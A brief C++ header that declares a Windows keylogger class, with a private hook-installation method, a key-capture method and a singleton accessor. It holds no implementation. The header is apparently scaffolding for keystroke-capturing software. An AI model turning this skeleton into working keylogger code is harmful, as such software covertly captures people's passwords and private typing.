#pragma once
#include <iostream>
#include <Windows.h>

class keylogger_client
{
	MSG msg;
	BOOL bRet;
	uint32_t seconds;

	bool install_hook();
public:
	keylogger_client();
	bool capture_keys();

	static keylogger_client* get();
};

